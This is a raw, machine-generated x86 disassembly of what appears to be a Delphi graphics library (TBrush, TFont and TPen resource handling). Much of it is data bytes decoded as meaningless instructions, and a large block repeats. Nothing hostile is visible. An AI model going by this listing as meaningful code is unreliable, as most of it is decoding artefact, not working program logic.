jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
les eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc40041c4
imul esp [ ebx + 0x73 ] 0x41c4b090
nop
inc edi
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
[ eax ]
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
lds eax [ ecx ]
and al 0x0
add [ eax ] al
les eax [ fs : ecx ]
stosb [ edi ]
jo r-xdata
insb
xor eax [ eax ]
js r-xdata
les eax [ ecx ]
imul esp [ ebx + 0x73 ] 0xc08b0000
add al 0xc5
inc ecx
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
xor [ eax ] al
add ch bl
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ ebp + ebx * 8 + 0x41 ] al
inc eax
add al bl
imul sp [ ebp + 0x72 ] 0x112c
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
lds eax [ ecx ]
and [ eax ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
add [ eax ] al
add ch al
inc ecx
imul esp [ ebx + 0x73 ] 0xffff0001
nop
test ch al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4bffbe3b ] dl
lds eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ 0xffffffffaa0041c5 ] al
sub_41c6b8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bh al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 ] cl
inc ecx
add [ eax + eax ] bl
add [ eax ] al
les eax [ fs : ecx ]
insb
xor eax [ eax ]
js r-xdata
add al 0x54
push eax
outsb
add bh al
inc ecx
add ah dl
les eax [ ecx ]
add al 0x0
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
sbb al 0xe2
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edx + 0x41 ] al
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
sbb bh al
inc ecx
add [ edi ] al
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc1100004
inc ecx
add [ ebx + 0x41 ] ah
add [ ebx + 0x41 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ecx
add [ eax - 0x1c ] bh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xc800c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
enter 0x41 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 8 ] cl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + eax * 8 + 0x41 ] ah
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
in al 0xe4
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ 0x54060041 ] cl
inc edx
jb r-xdata
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
enter 0x41 0x0
nop
sbb al cl
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
jb r-xdata
outsd
mov al 0xc5
inc ecx
add [ eax + eax ] cl
add bh bh
inc ecx
add al dh
out dx al
inc ecx
add ah bl
out dx al
inc ecx
add [ eax ] dl
out dx al
inc ecx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edi
enter 0x41 0x7
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add ah bl
enter 0x41 0x58
add [ eax ] al
add [ esp + ebx ] bl
jae r-xdata
popad
jae r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ eax + 0x65 ]
outsb
mov eax eax
mov ecx cs
inc ecx
add [ ebx ] al
push cs
mov [ ecx ] 0xff000010
mov ah 0xec
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
call sub_420a55
add al cl
inc ecx
add ah dl
les eax [ ecx ]
add al [ eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax - 0x18 ] ah
inc ecx
add [ eax ] al
dec eax
enter 0x41 0x90
sbb al 0x41
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pushad
call 0x4841c907
fmul st0
inc ecx
add [ eax ] bl
add [ eax ] al
sbb al 0x1c
imul esp [ ebx + 0x73 ] 0xc1100002
inc ecx
add [ esi + 0x41 ] al
add [ esi + 0x41 ] cl
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xa0041c9 ] cl
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc8140004
inc ecx
add [ eax + eax ] dl
add bh bh
shr ah 0x1
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
out 0x41 al
retn
retn
push ebx
je r-xdata
add [ eax + edx - 0x336fffc0 ] ch
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
outsd
outsb
add al 0x42
jns r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
popad
jae r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
outsd
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
or [ eax + 0x73 ] dh
inc ebp
dec ebp
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
xchg ebx eax
0x41
push ebx
je r-xdata
push es
inc eax
jb r-xdata
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fstp [ esi + 0x240041ca ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41cb20c0 ] cl
add [ edx + 0x41ca ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
test bl cl
inc ecx
add [ ebx + ecx * 8 + 0x280041 ] cl
add [ eax ] al
or al 0x1d
inc ecx
add [ ebx + esi + 0x40 ] ch
add al al
dec eax
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
add [ eax + 0x6c0041c9 ] cl
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x40110c00
jb r-xdata
jae r-xdata
add [ esi - 0x36 ] ch
inc ecx
add [ ecx ] al
add [ eax ] al
outsb
add [ si ] cl
adc [ eax ] eax
mov cl cl
inc ecx
add [ eax + edx + 0x40 ] ch
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ebp
jbe r-xdata
or al 0x11
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ eax ] al
nop
int3
sub_41c776
inc eax
in al 0x41
add [ eax - 0x1c ] cl
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
jo r-xdata
inc ecx
add [ eax - 0x1c ] bh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0xc800c08b
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
enter 0x41 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 8 ] cl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ esp + eax * 8 + 0x41 ] ah
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
in al 0xe4
inc ecx
add [ eax ] al
dec eax
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ 0x54060041 ] cl
inc edx
jb r-xdata
add [ eax ] al
jae r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
enter 0x41 0x0
nop
sbb al cl
inc ecx
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
jb r-xdata
outsd
mov al 0xc5
inc ecx
add [ eax + eax ] cl
add bh bh
inc ecx
add al dh
out dx al
inc ecx
add ah bl
out dx al
inc ecx
add [ eax ] dl
out dx al
inc ecx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edi
enter 0x41 0x7
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add ah bl
enter 0x41 0x58
add [ eax ] al
add [ esp + ebx ] bl
jae r-xdata
popad
jae r-xdata
add [ eax ] al
add [ ebx ] 0x0
add edx [ eax + 0x65 ]
outsb
mov eax eax
mov ecx cs
inc ecx
add [ ebx ] al
push cs
mov [ ecx ] 0xff000010
mov ah 0xec
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
outsd
outsb
je r-xdata
jae r-xdata
call sub_420a55
add al cl
inc ecx
add ah dl
les eax [ ecx ]
add al [ eax ]
or [ edi + 0x72 ] al
popad
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc ecx
add [ eax ] cl
dec eax
inc ecx
add [ edi + eax * 2 ] bl
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ eax - 0x18 ] ah
inc ecx
add [ eax ] al
dec eax
enter 0x41 0x90
sbb al 0x41
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc ecx
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
pushad
call 0x4841c907
fmul st0
inc ecx
add [ eax ] bl
add [ eax ] al
sbb al 0x1c
imul esp [ ebx + 0x73 ] 0xc1100002
inc ecx
add [ esi + 0x41 ] al
add [ esi + 0x41 ] cl
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xa0041c9 ] cl
jo r-xdata
imul esp [ ebx + 0x73 ] 0xc8140004
inc ecx
add [ eax + eax ] dl
add bh bh
shr ah 0x1
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
out 0x41 al
retn
retn
push ebx
je r-xdata
add [ eax + edx - 0x336fffc0 ] ch
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
outsd
outsb
add al 0x42
jns r-xdata
or [ edx + 0x65 ] edx
jb r-xdata
push ebx
je r-xdata
popad
jae r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
jmp [ eax + 0xc ]
ja r-xdata
jb r-xdata
jb r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
outsd
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
or [ eax + 0x73 ] dh
inc ebp
dec ebp
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
jae r-xdata
add ecx [ ebp + 0x73 ]
push es
xchg ebx eax
0x41
push ebx
je r-xdata
push es
inc eax
jb r-xdata
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
fstp [ esi + 0x240041ca ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41cb20c0 ] cl
add [ edx + 0x41ca ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 8 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
test bl cl
inc ecx
add [ ebx + ecx * 8 + 0x280041 ] cl
add [ eax ] al
or al 0x1d
inc ecx
add [ ebx + esi + 0x40 ] ch
add al al
dec eax
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
add [ eax + 0x6c0041c9 ] cl
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x40110c00
jb r-xdata
jae r-xdata
add [ esi - 0x36 ] ch
inc ecx
add [ ecx ] al
add [ eax ] al
outsb
add [ si ] cl
adc [ eax ] eax
mov cl cl
inc ecx
add [ eax + edx + 0x40 ] ch
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ebp
jbe r-xdata
or al 0x11
outsb
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
adc [ eax ] al
nop
int3
sub_41cdc0
insb
xor eax [ eax ]
ror [ eax + 0x41 ] 0x0
jl r-xdata
adc eax 0x15f40042
inc edx
add [ eax + 0x16 ] bl
inc edx
add [ ebp + eax + 0x42 ] cl
add ah ah
push ss
inc edx
add ah al
pop ss
inc edx
add [ eax + 0x1b ] ah
inc edx
add [ eax ] dh
push es
inc edx
add [ esp + ebx + 0x42 ] cl
add [ eax + 0x1c ] dl
inc edx
add [ eax + 0x5000421d ] ch
adc al 0x42
add [ eax + 0x5 ] dl
inc edx
add [ eax + 0x4800421a ] al
pop ss
inc edx
add [ ebx + ebx + 0x42 ] al
add ah bh
pop ds
inc edx
add [ eax + 0x9004220 ] al
push esp
dec ebp
je r-xdata
inc eax
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
cwde
adc al 0x42
add [ eax ] al
dec eax
inc ecx
add [ ebx + eax + 0x14c80042 ] dh
inc edx
add [ eax + 0x49 ] dl
inc ecx
add [ ebx + eax + 0x42 ] al
add [ ebp + edx + 0x42 ] bl
add [ eax ] al
add al 0x42
add ah ch
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
imul bp [ ebp - 0x75 ] 0x54c0
into
inc ecx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
nop
and al 0x42
add ah ch
and al 0x42
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
imul bp [ ebp - 0x20 ] 0x41cd
add [ eax + 0x41cb ] bl
add [ eax ] cl
inc edi
jb r-xdata
lea eax [ bx + si ]
and bh cl
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x41 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
iretd
imul esp [ ebx + 0x73 ] 0xcec00000
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
into
inc ecx
add [ eax + eax ] dh
add ah dl
int3
sub_41cef6
inc ecx
add [ eax + eax ] bh
add [ eax ] al
aam 0xca
inc ecx
add [ ebx + esi + 0x40 ] ch
add al al
dec eax
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
jl r-xdata
inc edx
add [ edx + edi + 0x42 ] bl
add [ eax + 0x42 ] bl
inc edx
add [ ebx + eax * 2 ] ch
inc edx
add [ esi + eax ] dh
inc edx
add [ eax + 0x44 ] dl
inc edx
add [ esp + eax * 2 + 0x2f140042 ] ah
inc edx
add [ eax + 0x5 ] dl
inc edx
add al bl
add eax 0x38d80042
inc edx
add [ edi + eax * 2 + 0x42 ] ah
add [ eax + edi + 0x42 ] dl
add [ edi + eax * 2 + 0x42 ] ch
add [ esi + 0x35840042 ] ah
inc edx
add [ eax ] ah
inc ecx
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41cf9c70
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41cf2070
add [ eax + 0x41cb ] bl
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ eax ] al
dec eax
inc ecx
add [ ebx + eax + 0x2fb80042 ] dh
inc edx
add [ eax + 0x49 ] dl
inc ecx
add [ ecx + esi + 0x320c0042 ] cl
inc edx
add [ eax ] al
add al 0x42
add al al
xor al 0x42
add [ ebp + esi + 0x42 ] dh
add [ ebp + esi + 0x54c0042 ] dh
inc edx
add [ eax ] dl
popad
nop
rol [ fs : ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xd0
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
rol [ ecx ] 0x1
jo r-xdata
xor al 0x0
add [ eax ] al
aam 0xca
inc ecx
add [ ebx + esi + 0x40 ] ch
add al al
dec eax
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
test al 0x48
inc edx
add [ eax ] al
dec eax
inc ecx
add [ ebx + eax + 0x48d80042 ] dh
inc edx
add [ eax + 0x49 ] dl
inc ecx
add [ ebx + eax + 0x42 ] al
add [ eax ] bh
dec ecx
inc edx
add [ eax ] al
add al 0x42
add [ eax + 0x49 ] bh
inc edx
add [ ecx + ecx * 2 + 0x5480042 ] ah
inc edx
add [ ebp + eax + 0x42 ] cl
add [ eax - 0x33ffbdb7 ] bh
add eax 0x4c3c0042
inc edx
add [ eax ] dh
push es
inc edx
add [ esp + ecx * 2 + 0x42 ] dl
add [ eax + 0x4c ] bl
inc edx
add [ esi + eax + 0x42 ] al
add [ eax + ecx * 2 + 0x42 ] dl
add [ eax + 0x5 ] dl
inc edx
add al bl
add eax 0x4af80042
inc edx
add [ eax + 0x4c ] dh
inc edx
add [ eax - 0x53ffbdb4 ] bl
dec esp
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
aam 0xd0
inc ecx
add [ edi ] al
add eax 0x6f634954
outsb
rol [ fs : ecx ] 0x1
cwde

add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
rol [ ecx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x41d0 0x0
imul esp [ ebx + 0x73 ] 0xc08b0000
or al dl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 8 ] cl
inc ecx
add [ eax ] bl
add [ eax ] al
add ah dl
int3
sub_41d0e1
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ ecx + edx * 8 + 0x54100041 ] dh
push edx
jo r-xdata
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403498
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41d178
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_41d1b4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_41d1f0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41d164
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41d1d8
xor edx edx
push ebp
push sub_41d2c4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d2cb
mov eax [ ebp - 0x4 ]
call sub_41d1e4
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026e4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028e0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407bec
test al al
je r-xdata
sub_41d2d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1d8
xor ecx ecx
push ebp
push sub_41d35b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d1e4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41d384
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41d1d8
xor eax eax
push ebp
push sub_41d3ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d1f0
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41d2d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d3f4
mov eax [ ebp - 0x4 ]
call sub_41d1e4
retn
mov eax ebx
mov si 0xfffd
call sub_403320
sub_41d3fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
